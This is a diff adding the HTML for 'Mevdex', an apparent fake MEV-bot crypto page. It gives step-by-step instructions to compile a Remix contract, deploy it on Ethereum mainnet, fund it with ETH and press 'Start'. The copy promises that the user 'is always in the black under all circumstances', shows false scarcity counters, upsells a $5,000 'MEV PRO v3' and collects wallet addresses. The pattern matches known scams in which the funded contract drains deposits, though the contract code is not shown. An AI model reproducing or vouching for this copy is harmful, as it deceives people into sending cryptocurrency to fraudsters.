@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js"></script>
+    <link rel="stylesheet" href="css/style.css">
+    <script defer src="js/menu.js"></script>
+    <script defer src="js/slider.js"></script>
+    <script defer src="js/popup.js"></script>
+    <title>Mevdex</title>
+</head>
+<body>
+    <div class="wrapper">
+        <header class="header">
+            <div class="container header__container">
+                <div id="nav" class="header__inner">
+                    <div class="header__left">
+                        <button type="button" class="hamburger" id="menu-btn">
+                            <span class="hamburger-top"></span>
+                            <span class="hamburger-middle"></span>
+                            <span class="hamburger-bottom"></span>
+                        </button>
+                        <img src="img/logo.svg" alt="" class="header__logo">
+                        <a href="#" class="header__logo-text">MEVDEX</a>
+                    </div>
+                    <nav class="nav">
+                        <ul class="nav__list">
+                            <li class="nav__list-item">
+                                <a href="#" class="nav__list-link">
+                                    <img src="img/product-icon.svg" alt="" class="nav__list-icon">
+                                    Product
+                                </a>
+                            </li>
+                            <li class="nav__list-item">
+                                <a href="#" class="nav__list-link">
+                                    <img src="img/tokens-icon.svg" alt="" class="nav__list-icon">
+                                    Tokens
+                                </a>
+                            </li>
+                            <li class="nav__list-item">
+                                <a href="#" class="nav__list-link">
+                                    <img src="img/pool-icon.svg" alt="" class="nav__list-icon">
+                                    Pool
+                                </a>
+                            </li>
+                        </ul>
+                    </nav>
+                    <div class="header__right">
+                        <a href="#" class="header__right-link">
+                            <img src="img/github.png" alt="" class="header__right-icon">
+                        </a>
+                        <a href="#" class="header__right-login">Login</a>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <div class="mobile-menu hidden" id="menu">
+            <ul class="nav__list">
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/product-icon.svg" alt="" class="nav__list-icon">
+                        Product
+                    </a>
+                </li>
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/pool-icon.svg" alt="" class="nav__list-icon">
+                        Pool
+                    </a>
+                </li>
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/receipt.svg" alt="" class="nav__list-icon">
+                        Warranty
+                    </a>
+                </li>
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/transform-green.svg" alt="" class="nav__list-icon">
+                        Arbitrage
+                    </a>
+                </li>
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/layers-green.svg" alt="" class="nav__list-icon">
+                        Sandwich
+                    </a>
+                </li>
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/bank-green.svg" alt="" class="nav__list-icon">
+                        Liquidation
+                    </a>
+                </li>
+                <li class="nav__list-item">
+                    <a href="#" class="nav__list-link">
+                        <img src="img/union-green.svg" alt="" class="nav__list-icon">
+                        Flashloan
+                    </a>
+                </li>
+            </ul>
+        </div>
+        <main class="main">
+             
+            <section class="instructions">
+                <div class="container">
+                    <div class="instructions__inner">
+                        <h2 class="instructions__title-mobile">Instructions</h2>
+                        <h1 class="instructions__title"><span class="instructions__title-first-span"> <span> <span class="instructions__title-span">Instructions.</span> Installing </span><div class="instructions__title-img"></div></span>with a smart contract.</h1>
+                        <h2 class="instructions__subtitle"><img src="img/coin.png" alt="" class="instructions__subtitle-img"> ATTENTION</h2>
+                        <ul class="instructions__list">
+                            <li class="instructions__list-item">Repeated creation of a smart contract is prohibited</li>
+                            <li class="instructions__list-item">If you try to duplicate a smart contract, the robot suspends payments to your specified purse, this functionality is limited in the free version</li>
+                            <li class="instructions__list-item">The amount you contribute to the MEB bot will not change, re-funding is prohibited, if you re-create a smart contract the amount will be burned.</li>
+                            <li class="instructions__list-item">We recommend to fund the contract with at least 2 ETH, but you might need at least 0.5 ETH to cover gas and possible burn, below 0.5 ETH scripts and smart contract might not work correctly. </li>
+                            <li class="instructions__list-item">Except for the gas fee, the bot does not incur losses, it only makes trades when there is a suitable arbitrage opportunity for profit, so the user is always in the black under all circumstances.</li>
+                            <li class="instructions__list-item">To remove all restrictions, use the MEV PRO v3 program and use the full functionality.</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="guide">
+                <div class="container guide__container">
+                    <div class="guide__inner">
+                        <div class="guide__grid">
+                            <div class="guide__left">
+                                <div class="guide__card">
+                                    <img src="img/one.svg" alt="" class="guide__card-number">
+                                    <h3 class="guide__card-title">Download MetaMask</h3>
+                                    <p class="guide__card-text">
+                                        if you don’t have it already
+                                    </p>
+                                    <img src="img/fox.png" alt="" class="guide__card-decor">
+                                    <a href="#" class="guide__card-link">
+                                        Download MetaMask
+                                        <img src="img/btn-icon.svg" alt="" class="guide__card-link-icon">
+                                    </a>
+                                </div>
+                                <div class="guide__card">
+                                    <img src="img/two.svg" alt="" class="guide__card-number">
+                                    <h3 class="guide__card-title">Access Remix</h3>
+                                    <p class="guide__card-text">
+                                        To synchronize the bot with your wallet 
+                                    </p>
+                                    <a id="popupBtn" href="#" class="guide__card-link">
+                                        Site Remix
+                                        <img src="img/btn-icon.svg" alt="" class="guide__card-link-icon">
+                                    </a>
+                                </div>
+                                <div class="guide__card">
+                                    <img src="img/three.svg" alt="" class="guide__card-number">
+                                    <h3 class="guide__card-title">Smart contract generation </h3>
+                                    <p class="guide__card-text">
+                                        Please generate smart contracts if you have read the guidelines, agree to the terms and conditions and intend to use this smart contract for its intended purpose. The number of unique smart contracts is strictly limited. 
+                                    </p>
+                                    <p class="guide__card-quantity">Quantity: <span class="guide__card-quantity-span">112 / 800</span></p>
+                                    <a href="#" class="guide__card-link">
+                                        Create smart contract
+                                        <img src="img/btn-icon.svg" alt="" class="guide__card-link-icon">
+                                    </a>
+                                </div>
+                                <div class="guide__item">
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.1</span>
+                                        Head over to the Sidebar, Click on the “contracts” folder and then create “New File”. Rename it as “MEVDEXBOT”
+                                    </p>
+                                    <img src="img/step1.png" alt="" class="guide__item-img">
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.2</span>
+                                        Go to the “Solidity Compiler” tab.
+                                    </p>
+                                    <img src="img/step2.png" alt="" class="guide__item-img">
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.3</span>
+                                        Select version “0.6.6” and then press “MEVDEXBOT”.
+                                    </p>
+                                    <img src="img/step3.png" alt="" class="guide__item-img">
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.4</span>
+                                        Go to the “Deploy & Run Transactions” tab and on Environment select the “Injected Provider - Metamask”
+                                    </p>
+                                    <img src="img/step4.png" alt="" class="guide__item-img">
+                                    <p class="guide__item-text guide__item-text--noimg">
+                                        <span class="guide__item-text-span">4.5</span>
+                                        It will appear a Metamask popup to connect your wallet, connect the wallet you want to deploy the bot. Make sure you are on Ethereum Mainnet.
+                                    </p>
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.6</span>
+                                        Just press the arrow down to open up the deploy window.
+                                    </p>
+                                    <img src="img/step5.png" alt="" class="guide__item-img guide__item-img--last">
+                                </div>
+                            </div>
+                            <div class="guide__right">
+                                <div class="guide__item">
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.7</span>
+                                        Copy your newly created contract address and fund it with any amount of ETH that you would like the bot to earn with by simply sending ETH to your newly created contract address.
+                                    </p>
+                                    <img src="img/step6.png" alt="" class="guide__item-img">
+                                    <p class="guide__item-text">
+                                        <span class="guide__item-text-span">4.8</span>
+                                        Head over to your Metamask and fund your newly created contract.Go to the “Solidity Compiler” tab.
+                                    </p>
+                                    <img src="img/step7.png" alt="" class="guide__item-img ">
+                                    <p class="guide__item-text guide__item-text--modified">
+                                        <span class="guide__item-text-span">4.9</span>
+                                        After your transaction is confirmed your balance should appear like this on your contract.
+                                    </p>
+                                    <img src="img/step8.png" alt="" class="guide__item-img">
+                                    <p class="guide__item-text guide__item-text--list">
+                                        <span class="guide__item-text-span">5</span>
+                                        Press "Start" button to launch the bot.
+                                    </p>
+                                    <ul class="guide__item-list">
+                                        <li class="guide__item-list-item">The bot will immediately start working, bringing you profit from trades.</li>
+                                        <li class="guide__item-list-item">Withdrawal of funds will be carried out automatically to the purse you specified. When you click the withdrawal button, you will fully return the money operated by MEV BOT (body of the deposit + percentage of trades), the script will be suspended. Carry out the withdrawal in case you see the result and intend to buy MEV PRO v3.</li>
+                                    </ul>
+                                </div>
+                                <div class="guide__mev">
+                                    <h3 class="guide__mev-title">MEV PRO v3</h3>
+                                    <div class="guide__mev-info">
+                                        <a href="#" class="guide__mev-link">
+                                            <img src="img/basket.svg" alt="" class="guide__mev-link-icon">
+                                            $5.000
+                                        </a>
+                                        <p class="guide__mev-quantity">Quantity :  <span class="guide__mev-quantity-span">112 / 800</span></p>
+                                    </div>
+                                    <img src="img/guidemev.png" alt="" class="guide__mev-img">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+        </main>
+        <footer class="footer">
+            <div class="container">
+                <div class="footer__inner">
+                    <div class="footer__banner">
+                        <div class="footer__nav">
+                            <ul class="footer__social-list">
+                                <li class="footer__social-list-item">
+                                    <a href="#" class="footer__social-list-link">
+                                        <img src="img/discord.png" alt="" class="footer__social-list-icon">
+                                    </a>
+                                </li>
+                                <li class="footer__social-list-item">
+                                    <a href="#" class="footer__social-list-link">
+                                        <img src="img/twitter.png" alt="" class="footer__social-list-icon">
+                                    </a>
+                                </li>
+                                <li class="footer__social-list-item">
+                                    <a href="#" class="footer__social-list-link">
+                                        <img src="img/facebook.png" alt="" class="footer__social-list-icon">
+                                    </a>
+                                </li>
+                            </ul>
+                            <ul class="footer__list">
+                                <li class="footer__list-item">
+                                    <a href="#" class="footer__list-link">FAQ</a>
+                                </li>
+                                <li class="footer__list-item">
+                                    <a href="#" class="footer__list-link">Bloq</a>
+                                </li>
+                                <li class="footer__list-item">
+                                    <a href="#" class="footer__list-link">Warranty</a>
+                                </li>
+                            </ul>
+                        </div>
+                        <img src="img/rocket.png" alt="" class="footer__img">
+                    </div>
+                    <a href="#" class="footer__logo"><img src="img/footer-logo.svg" alt="" class="footer__logo-img"></a>
+                </div>
+            </div>
+        </footer>
+
+        <div id="popup" class="popup">
+            <div class="popup__content">
+                <div class="popup__top">
+                    <div class="popup__nav">
+                        <button id="popupClose" class="popup__close">
+                            <img src="img/arrow-big.png" alt="" class="popup__close-icon">
+                        </button>
+                        <img src="img/fox.png" alt="" class="popup__decor-mobile">
+                    </div>
+                    <div class="popup__info">
+                        <p class="popup__text">
+                            Specify the address of your Metamask Wallet from which the smart contract will be generated and to which your income will be credited. 
+                        </p>
+                        <p class="popup__text">Please note, it must be the same wallet. </p>
+                    </div>
+                    <img src="img/fox.png" alt="" class="popup__decor">
+                </div>
+                <form class="popup__form">
+                    <input type="text" class="popup__form-input">
+                    <button class="popup__form-submit">
+                        <img src="img/arrow-right.png" alt="" class="popup__form-submit-icon">
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
